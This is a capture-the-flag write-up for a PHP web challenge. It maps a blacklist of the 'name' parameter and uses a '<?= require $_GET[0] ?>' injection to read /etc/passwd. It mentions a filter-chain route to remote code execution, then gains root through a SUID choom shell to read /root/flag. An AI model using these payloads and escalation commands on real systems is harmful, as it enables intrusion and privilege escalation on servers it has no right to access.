# renderme

This is a web CTF challenge without source code.

## 1. Challenge Overview

The web page simply gives one line:

> Please tell me your name: `/?name=CTFer`

- A quick test shows that the name is printed on the webpage.
- Note that without any bots provided, it doesn't seem likely to be an XSS challenge.
- Looking at the response header, it shows `X-Powered-By: PHP/8.4.15`. We are dealing with PHP as we always do in web CTF challenges.

## 2. Identifying blacklisted and allowed characters

With some trials, the page blocked these substrings in the `name` parameters, case-insensitive:

```python
blocked = ["'", '"', '(', ')', '`', 'php', 'dir', 'exec', 'eval', 'include', 'highlight_file', 'glob', 'read_file']
```

We cannot call functions since `()` are blocked.

And these are some of the allowed substrings:

```python
allowed = ['[', ']', '{', '}', ';', '$', '<?=', '?>', 'shell', 'file', 'require']
```

With function calls not available, `require` is the most likely syntax we can use.

## 3. Obtaining RCE

We can read the file `/etc/passwd` by:
`http://web-c83e669618.challenge.xctf.org.cn/?0=/etc/passwd&name=<?= require $_GET[0] ?>`

Since other GET parameters except `name` is not restricted, `php://` protocol can be used. In particular, the `filter` wrapper can be used for remote code execution (RCE).

With a PHP filter chain generator script used, we can run arbitrary commands on the server.

However looking through the server files gives no hint on where the flag is. There are no file names containing `flag` nor useful file content containing `flag`. Environment variables give nothing as well.

We thought it may require further privilege escalation.

## 4. Privilege Escalation

As a typical first step, we run these commands to identify any executables allowing root access:
- `sudo -l`
- `find / -perm -4000 -type f`

Luckily the second one gives this list:

```
/usr/bin/chfn
/usr/bin/choom
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/umount
/usr/lib/openssh/ssh-keysign
```

Then we check on GTFOBins at https://gtfobins.github.io/gtfobins/choom/.
Quick tests below allow us to get the flag.

```bash
/usr/bin/choom -n 0 -- /bin/sh -p -c 'ls /root/'
/usr/bin/choom -n 0 -- /bin/sh -p -c 'cat /root/flag'
```

## 5. Solve script

Solve script is at `solve.py`.

